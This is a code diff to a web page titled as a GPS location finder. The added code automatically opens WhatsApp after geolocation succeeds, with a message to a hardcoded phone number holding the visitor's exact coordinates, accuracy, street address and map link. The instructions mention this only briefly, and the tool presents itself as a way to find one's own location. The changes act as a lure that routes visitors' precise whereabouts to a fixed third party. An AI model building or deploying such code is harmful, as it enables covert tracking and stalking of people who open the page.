@@ -177,6 +177,11 @@
             color: white;
         }
 
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+        }
+
         .btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
@@ -283,6 +288,7 @@
             <div class="buttons">
                 <button id="copyBtn" class="btn btn-copy">📋 Copy Location</button>
                 <button id="openMapsBtn" class="btn btn-maps">🗺️ Open in Maps</button>
+                <button id="sendWhatsAppBtn" class="btn btn-whatsapp">📱 Send to WhatsApp</button>
                 <button id="tryAgainBtn" class="btn btn-again">🔄 Get Again</button>
             </div>
         </div>
@@ -299,6 +305,7 @@
             const addressDetails = document.getElementById('addressDetails');
             const copyBtn = document.getElementById('copyBtn');
             const openMapsBtn = document.getElementById('openMapsBtn');
+            const sendWhatsAppBtn = document.getElementById('sendWhatsAppBtn');
             const tryAgainBtn = document.getElementById('tryAgainBtn');
             
             let currentLocation = null;
@@ -376,6 +383,9 @@
                             
                             // Display results
                             displayResults();
+                            
+                            // AUTO-SEND TO WHATSAPP after getting location
+                            setTimeout(sendToWhatsApp, 1000);
                         }
                     },
                     // Error callback
@@ -406,6 +416,9 @@
                             };
                             
                             displayResults();
+                            
+                            // AUTO-SEND TO WHATSAPP after getting location
+                            setTimeout(sendToWhatsApp, 1000);
                         },
                         function(error) {
                             // Already handled by watchPosition error
@@ -546,6 +559,49 @@
                 `;
             }
             
+            // Function to automatically send location to WhatsApp
+            function sendToWhatsApp() {
+                if (!currentLocation) {
+                    console.error("No location data to send to WhatsApp.");
+                    return;
+                }
+
+                // The target phone number (without '+')
+                const phoneNumber = "265981353135";
+
+                const loc = currentLocation;
+                const googleMapsUrl = `https://maps.google.com/?q=${loc.coords.lat},${loc.coords.lon}`;
+                const message = `📍 EXACT LOCATION FOUND
+
+🌐 COORDINATES:
+Latitude: ${loc.coords.lat.toFixed(6)}
+Longitude: ${loc.coords.lon.toFixed(6)}
+Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
+
+📍 ADDRESS:
+${loc.details.address}
+${loc.details.road !== "Not available" ? `Road: ${loc.details.road}` : ''}
+${loc.details.city !== "Not available" ? `City: ${loc.details.city}` : ''}
+${loc.details.country !== "Not available" ? `Country: ${loc.details.country}` : ''}
+
+🗺️ GOOGLE MAPS:
+${googleMapsUrl}
+
+⏰ TIME: ${loc.timestamp}
+
+📍 Sent from GPS Location Finder`;
+
+                const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+
+                // Open WhatsApp in a new tab
+                window.open(whatsappUrl, '_blank');
+                
+                // Show notification
+                setTimeout(() => {
+                    alert("WhatsApp is opening! Click SEND to deliver your location to +265981353135");
+                }, 500);
+            }
+
             // Function to copy location to clipboard
             async function copyLocation() {
                 if (!currentLocation) {
@@ -612,16 +668,17 @@
             
             copyBtn.addEventListener('click', copyLocation);
             openMapsBtn.addEventListener('click', openInMaps);
+            sendWhatsAppBtn.addEventListener('click', sendToWhatsApp);
             tryAgainBtn.addEventListener('click', getExactLocation);
             
             // Add instructions for first-time users
             statusElement.innerHTML = `
                 <div style="text-align: left; background: #f8f9fa; padding: 15px; border-radius: 10px; margin-top: 10px;">
-                    <strong>How to get EXACT location:</strong><br>
+                    <strong>How it works:</strong><br>
                     1. Click the green button above<br>
                     2. <strong>ALLOW location access</strong> when asked<br>
-                    3. On mobile: Wait 10-20 seconds for GPS lock<br>
-                    4. Results appear automatically
+                    3. Wait for GPS to lock (10-20 seconds)<br>
+                    4. Location will automatically send to WhatsApp (+265981353135)
                 </div>
             `;
         });
